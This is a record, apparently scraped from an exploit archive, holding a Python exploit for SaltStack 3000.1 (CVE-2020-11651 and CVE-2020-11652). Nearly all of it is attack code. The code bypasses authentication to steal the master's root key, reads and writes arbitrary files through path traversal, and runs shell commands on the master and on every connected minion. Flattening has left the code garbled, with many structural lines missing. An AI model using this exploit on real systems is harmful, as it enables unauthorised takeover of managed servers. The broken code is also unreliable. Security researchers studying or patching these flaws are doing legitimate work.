{
    "text": "vul_name : Saltstack 3000.1 Remote Code Execution ， vul_cve : CVE-2020-11652 , CVE-2020-11651 ， vul_poc :  # Exploit Title : Saltstack 3000.1 - Remote Code Execution ，  # Date : 2020-05-04 ，  # Exploit Author : Jasper Lievisse Adriaanse ，  # Vendor Homepage :  ，  # Version : < 3000.2 , < 2019.2.4 , 2017. *  , 2018. *  ，  # Tested on : Debian 10 with Salt 2019.2.0 ，  # CVE : CVE-2020-11651 and CVE-2020-11652 ，  # Discription : Saltstack authentication bypass/remote code execution ，  # Source :  ，  # This exploit is based on this checker script :  ，  #  ! /usr/bin/env python ，  # Exploit for CVE-2020-11651 and CVE-2020-11652 ，  # Written by Jasper Lievisse Adriaanse (  ，  # This exploit is based on this checker script :  ， from _future_ import absolute_import , print_function , unicode_literals ， minion_config = { ， 'transport' : 'zeromq' ,  ， 'pki_dir' : '/tmp' ,  ， 'id' : 'root' ,  ， 'log_level' : 'debug' ,  ， 'master_ip' : master_ip ,  ， 'master_port' : master_port ,  ， 'auth_timeout' : 5 ,  ， 'auth_tries' : 1 ,  ， 'master_uri' : 'tcp : /{0} : {1}'.format ( master_ip , master_port )  ， } ，  # - check funcs - ， print ( \" [ + ] Salt version : {}\".format ( salt.version._version_ )  ， vi = salt.version._version_info_ ， print ( \" [ + ] Checking salt-master ( {} : {} ) status. \".format ( master_ip , master_port )  , end=' )  ， sys.stdout.flush (  )  ，  # connection check ， channel.send ( {'cmd' : 'ping'} , timeout=2 )  ， print ( \"OFFLINE\" )  ， sys.exit ( 1 )  ， print ( \"ONLINE\" )  ， print ( \" [ + ] Checking if vulnerable to CVE-2020-11651. \" , end=' )  ， sys.stdout.flush (  )  ，  # try to evil ， rets = channel.send ( {'cmd' : '_prep_auth_info'} , timeout=3 )  ， print ( \"YES\" )  ， print ( \"ERROR\" )  ， raise ， pass ， finally :  ， root_key = rets [ 2 ]  [ 'root' ]  ， print ( \" [ + ] Checking if vulnerable to CVE-2020-11652 ( read_token ) . \" , end=' )  ， sys.stdout.flush (  )  ，  # try read file ， msg = { ， 'cmd' : 'get_token' ,  ， 'arg' :  [  ]  ,  ， 'token' : top_secret_file_path ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( \"YES\" )  ， print ( \"ERROR\" )  ， raise ， print (  )  ， print ( rets )  ， print ( \"NO\" )  ， print ( \" [ + ] Checking if vulnerable to CVE-2020-11652 ( read ) . \" , end=' )  ， sys.stdout.flush (  )  ，  # try read file ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'wheel' ,  ， 'fun' : 'file_roots.read' ,  ， 'path' : top_secret_file_path ,  ， 'saltenv' : 'base' ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( \"TIMEOUT\" )  ， print ( \"ERROR\" )  ， raise ， print (  )  ， print ( rets )  ， print ( \"YES\" )  ， print ( \"NO\" )  ， print ( \" [ + ] Checking if vulnerable to CVE-2020-11652 ( write1 ) . \" , end=' )  ， sys.stdout.flush (  )  ，  # try read file ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'wheel' ,  ， 'fun' : 'file_roots.write' ,  ， 'path' : '././././././././tmp/salt_CVE_2020_11652' ,  ， 'data' : 'evil' ,  ， 'saltenv' : 'base' ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( \"TIMEOUT\" )  ， print ( \"ERROR\" )  ， raise ， print (  )  ， print ( rets )  ， pp ( rets )  ， os.remove ( '/tmp/salt_CVE_2020_11652' )  ， print ( \"Maybe?\" )  ， print ( \"YES\" )  ， print ( \"NO\" )  ， print ( \" [ + ] Checking if vulnerable to CVE-2020-11652 ( write2 ) . \" , end=' )  ， sys.stdout.flush (  )  ，  # try read file ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'wheel' ,  ， 'fun' : 'config.update_config' ,  ， 'file_name' : '././././././././tmp/salt_CVE_2020_11652' ,  ， 'yaml_contents' : 'evil' ,  ， 'saltenv' : 'base' ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( \"TIMEOUT\" )  ， print ( \"ERROR\" )  ， raise ， print (  )  ， print ( rets )  ， os.remove ( '/tmp/salt_CVE_2020_11652.conf' )  ， print ( \"Maybe?\" )  ， print ( \"YES\" )  ， print ( \"NO\" )  ， print ( \" [ + ] Attemping to read {} from {}\".format ( path , master_ip )  ， sys.stdout.flush (  )  ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'wheel' ,  ， 'fun' : 'file_roots.read' ,  ， 'path' : path ,  ， 'saltenv' : 'base' ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( rets [ 'data' ]  [ 'return' ]  [ 0 ]  [ path ]  )  ， print ( \" [ + ] Attemping to upload {} to {} on {}\".format ( src , dest , master_ip )  ， sys.stdout.flush (  )  ， fh = open ( src , 'rb' )  ， payload = fh.read (  )  ， fh.close (  )  ， print ( ' [ - ] Failed to read {} : {}'.format ( src , e )  ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'wheel' ,  ， 'fun' : 'file_roots.write' ,  ， 'saltenv' : 'base' ,  ， 'data' : payload ,  ， 'path' : dest ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( ' [  ] {}'.format ( rets [ 'data' ]  [ 'return' ]  )  ， print ( \" [ + ] Attemping to execute {} on {}\".format ( cmd , master_ip )  ， sys.stdout.flush (  )  ， msg = { ， 'key' : root_key ,  ， 'cmd' : 'runner' ,  ， 'fun' : 'salt.cmd' ,  ， 'saltenv' : 'base' ,  ， 'user' : 'sudo_user' ,  ， 'kwarg' : { ， 'fun' : 'cmd.exec_code' ,  ， 'lang' : 'python' ,  ， 'code' : \"import subprocess ; subprocess.call ( '{}' , shell=True ) \".format ( cmd )  ， } ,  ， 'jid' : jid ,  ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( ' [ - ] Failed to submit job' )  ， print ( ' [ + ] Successfully scheduled job : {}'.format ( rets [ 'jid' ]  )  ， print ( \" [ + ] Attemping to execute '{}' on all minions connected to {}\".format ( cmd , master_ip )  ， sys.stdout.flush (  )  ， msg = { ， 'key' : root_key ,  ， 'cmd' : '_send_pub' ,  ， 'fun' : 'cmd.run' ,  ， 'user' : 'root' ,  ， 'arg' :  [ \"/bin/sh -c '{}'\".format ( cmd )  ]  ,  ， 'tgt' : ' * ' ,  ， 'tgt_type' : 'glob' ,  ， 'ret' : ' ,  ， 'jid' : jid ， } ， rets = channel.send ( msg , timeout=3 )  ， print ( ' [ - ] Failed to submit job' )  ， finally :  ， print ( ' [ + ] Successfully submitted job to all minions.' )  ， print ( ' [ - ] Failed to submit job' )  ， parser = argparse.ArgumentParser ( description='Saltstack exploit for CVE-2020-11651 and CVE-2020-11652' )  ， parser.add_argument ( '-master' , '-m' , dest='master_ip' , default='127.0.0.1' )  ， parser.add_argument ( '-port' , '-p' , dest='master_port' , default='4506' )  ， parser.add_argument ( '-force' , '-f' , dest='force' , default=False , action='store_false' )  ， parser.add_argument ( '-debug' , '-d' , dest='debug' , default=False , action='store_true' )  ， parser.add_argument ( '-run-checks' , '-c' , dest='run_checks' , default=False , action='store_true' )  ， parser.add_argument ( '-read' , '-r' , dest='read_file' )  ， parser.add_argument ( '-upload-src' , dest='upload_src' )  ， parser.add_argument ( '-upload-dest' , dest='upload_dest' )  ， parser.add_argument ( '-exec' , dest='exec' , help='Run a command on the master' )  ， parser.add_argument ( '-exec-all' , dest='exec_all' , help='Run a command on all minions' )  ， args = parser.parse_args (  )  ， print ( \" [  !  ] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\" )  ， time.sleep ( 1 )  ，  # Both src and destination are required for uploads ， print ( ' [ - ] Must provide both -upload-src and -upload-dest' )  ， sys.exit ( 1 )  ， channel = init_minion ( args.master_ip , args.master_port )  ， print ( \" [  ] This version of salt is vulnerable ! Check results below\" )  ， elif args.force :  ， print ( \" [  *  ] This version of salt does NOT appear vulnerable. Proceeding anyway as requested.\" )  ， sys.exit (  )  ， check_connection ( args.master_ip , args.master_port , channel )  ， root_key = check_CVE_2020_11651 ( channel )  ， print ( '\\n [  *  ] root key obtained : {}'.format ( root_key )  ， print ( ' [ - ] Failed to find root key.aborting' )  ， sys.exit ( 127 )  ，  # Assuming this check runs on the master itself , create a file with \"secret\" content ，  # and abuse CVE-2020-11652 to read it. ， top_secret_file_path = '/tmp/salt_cve_teta' ， with salt.utils.fopen ( top_secret_file_path , 'w' ) as fd :  ， fd.write ( \"top secret\" )  ，  # Again , this assumes we're running this check on the master itself ， with salt.utils.fopen ( '/var/cache/salt/master/.root_key' ) as keyfd :  ， root_key = keyfd.read (  )  ， check_CVE_2020_11652_read_token ( debug , channel , top_secret_file_path )  ， check_CVE_2020_11652_read ( debug , channel , top_secret_file_path , root_key )  ， check_CVE_2020_11652_write1 ( debug , channel , root_key )  ， check_CVE_2020_11652_write2 ( debug , channel , root_key )  ， os.remove ( top_secret_file_path )  ， sys.exit ( 0 )  ， pwn_read_file ( channel , root_key , args.read_file , args.master_ip )  ， print ( ' [ - ] Destination path must be relative ; aborting' )  ， sys.exit ( 1 )  ， pwn_upload_file ( channel , root_key , args.upload_src , args.upload_dest , args.master_ip )  ， jid = '{0 : %Y%m%d%H%M%S%f}'.format ( datetime.datetime.utcnow (  )  ， pwn_exec ( channel , root_key , args.exec , args.master_ip , jid )  ， print ( \" [  !  ] Lester , is this what you want? Hit ^C to abort.\" )  ， time.sleep ( 2 )  ， pwn_exec_all ( channel , root_key , args.exec_all , args.master_ip , jid )  ， main (  ) ",
    "time": "2020.05.06"
}